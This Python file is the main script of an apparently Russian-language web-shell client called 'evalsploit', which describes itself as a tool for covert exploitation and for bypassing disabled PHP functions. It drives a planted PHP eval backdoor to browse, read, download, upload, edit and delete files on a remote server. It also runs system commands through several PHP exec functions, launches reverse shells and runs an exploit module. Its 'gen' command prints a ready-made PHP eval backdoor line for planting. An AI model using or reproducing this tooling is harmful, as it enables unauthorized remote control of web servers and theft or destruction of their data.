import os
import random
import configparser

import modules.send as send
import modules.cd as chdr
import modules.copy as copy
import modules.ls as ls
import modules.delete as rm
import modules.cat as cat
import modules.download as dl
import modules.edit as edit
import modules.md as md
import modules.makefile as mf
import modules.upload as up
import modules.touch as tch
import modules.stat as stat
import modules.rename as rn
import modules.set as settings

import bypasses.trybypass as by
import bypasses.exec as run

import scan.sbd as sbd

import exploits.reverse as rs
import exploits.exploit as x


config = configparser.ConfigParser()
zed= config.read('settings.ini')
shell =config['SETTINGS']['shell']
read = config['SETTINGS']['read']
listdir = config['SETTINGS']['ls']
silent = config['SETTINGS']['silent']
reverse = config['SETTINGS']['reverse']

a=[]
who = []


url = input("URL@evalsploit~: ")

uagent = random.choice(open('useragents').read().splitlines())
if silent != "1": serverip = send.send(url,"echo $_SERVER['SERVER_ADDR'].\":\".$_SERVER['SERVER_PORT'];",uagent) 
else: serverip = ""

def hi():
    print(f'''
				 			   			                      	     
                                  ▄█                   ▄█           █▀   ▄█   	
         ▄▄▄▄  ▄▄▄▄ ▄▄▄▄  ▄▄▄▄    ██   ▄▄▄▄   ▄█ ▄▄▄   ██    ▄▄▄     ▄  ▄██▄  	
       ▄█▀▀▀▀█▌ ▀█▄  █▌  ▀▀ ▄██   ██  ▐██▀▀█▌ ███▀▀██  ██  ▄█▀▀██▄  ██   ██    
       ██▀▀▀▀▀   ▀█▄██   ▄██▀██▌  ██  ▄ ▀█▄▄  ██  ▄██  ██  ██▄▀ ██  ██   ██    
        ▀████▀    ▀██    ▀█▄▄██▀  █▀  ▀████▀  █████▀   █▀   ▀███▀   █▀   █▀    
       ▄                                      ██                           ▄ 	
        ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        {serverip}
                                               Средство скрытой эксплуатации      
                                               и байпаса отключенных функций

      
          
    _________________________Локальные настройки клиента_________________________

    Модули list:          ls, dir
    Модули cat:           base64, html
    Модули run:           exec, passthru, system, shell_exec, popen, proc_open
    Модуль тихого режима: 0,1 (выкл,вкл)  
    Опытные модули:       expect_popen, pcntl_exec 
    Модули reverse-shell: monkey, ivan
    
    _______________________________Активные модули_______________________________

    Модуль ls:            {listdir}
    Модуль cat:           {read}
    Модуль run:           {shell}
    Модуль reverse-shell: {reverse}
      ''')
    
hi()

if silent != "1":
    execlist = by.cmd(url,uagent)
    pwd = send.send(url,"echo __DIR__;",uagent) # PWD
    tatpwd = pwd
    if execlist != "":
        print("    Сервер поддерживает:  "+execlist)
        if shell not in execlist:
            print("    Сервер не поддерживает "+shell)
            who = execlist.split(',')
            shell = random.choice(who)
            print("    Установлен модуль ", shell)
            s
    else:
        print("    Доступных для работы модулей на сервере нет")
else:
    pwd = "/var/www/"
    statpwd = pwd
    
    print("    Включен тихий режим")
    print("    Установлена домашняя директория по умолчанию: /var/www/")
    print("    Чтобы установить директорию воспользуйтесь командой home")

print("\n")    


while True:
    
    #Пасом поставить footer с заменой символов на русские

    cmd = input("[>] ")
    arg = cmd.split(" ", 1)[0]
    try: com = cmd.split(" ", 1)[1]
    except: com = ""

    match arg:
        
#============== LS ==============#
        case "ls": 
            if listdir == "dir":
                print(ls.dir(url,com,pwd,uagent))
            if listdir == "ls":
                print(ls.ls(url,com,pwd,uagent))

#============== CD ==============#
        case "cd":
            if com == "": 
                print(pwd)
            else:
                pwd = chdr.chdir(url,com,pwd,uagent)
                
            
#============= COPY =============#
        case "cp":
            if com != "":
                copy.files(url,com,pwd,uagent)

#============ DELETE ============#
        case "rm":
            if com != "":
                if rm.file(url,com,pwd,uagent) != "1":
                    print("Успешно удалено")
                else:
                    print("Ошибка удаления")

#============== CAT ==============#
        case "cat":
            if com != "":
                if read == "html":
                    cat.file(url,com,pwd,uagent)
                if read == "base64":
                    cat.base(url,com,pwd,uagent)
                    

#============== PWD ==============#
        case "pwd":
            print(pwd) #print(cd) Уверен? Я же записываю в pwd cd, легче брать активную переменную

#============ DOWNLOAD ============#
        case "dl": #DownLoad
            dl.file(url,com,pwd,uagent)

#============== EDIT ==============#
        case "edit": #Придумать 
            fte,orname,path = edit.dl(url,com,pwd,uagent)
            print("Отредактируйте файл и нажмите любую кнопку для его обновления на сервере")
            os.system(fte)
            os.system('pause>nul')
            edit.ul(url,fte,orname,path,uagent)
            os.remove(fte)

#=============== DIR ==============#
        case "mkd": #dir
            md.mkdir(url,pwd,com,uagent)

#============== FILE ==============#
        case "mkf": #file
            mf.mkfile(url,pwd,com,uagent)

#============= UPLOAD =============#
        case "upl": #upload в PWD
            up.upload(url,pwd,uagent)

#============== TOUCH ==============#          
        case "touch": #file
            tch.time(url,pwd,com,uagent)

#=============== STAT ===============#   
        case "stat": #данные по файлу
            stat.data(url,pwd,com,uagent)

#============== RENAME ==============#   
        case "ren": #Upload FROM_URL TO DIR
            rn.obj(url,pwd,com,uagent)

        case "run":
            if shell == "exec":
                run.exec(url,uagent)
            if shell == "shell_exec":
                run.shell_exec(url,uagent)
            if shell == "system":
                run.system(url,uagent)
            if shell == "passthru":
                run.passthru(url,uagent)
            if shell == "popen":
                run.popen(url,uagent)
            if shell == "proc_open":
                run.proc_open(url,uagent)  
            if shell == "expect_popen":
                run.expect_popen(url,uagent)
            if shell == "pcntl_exec":
                run.pcntl_exec(url,uagent)
            if shell == "do":
                run.do(url,uagent)

        case "set":
            shell,read,listdir,silent,reverse = settings.sets(com)

        case "home":
            pwd = send.send(url,"echo __DIR__;",uagent)

        case "scan":
            print("Начат процесс сканирования")
            sbd.sbd(url,com,pwd,uagent)
        
        case "info":
            urltext = [] 

        case "gen":
            print()
            print("if(isset($_POST['Z'])){@eval($_POST['Z']);die();}")
            print()

        case "reverse":
            print("Стартуем")
            if reverse == "monkey":
                rs.shell(url,pwd,com,uagent)
            if reverse == "ivan":
                rs.shell2(url,com,uagent)

        

        case "exploit":
            x.steightone(url,com,uagent)
            


            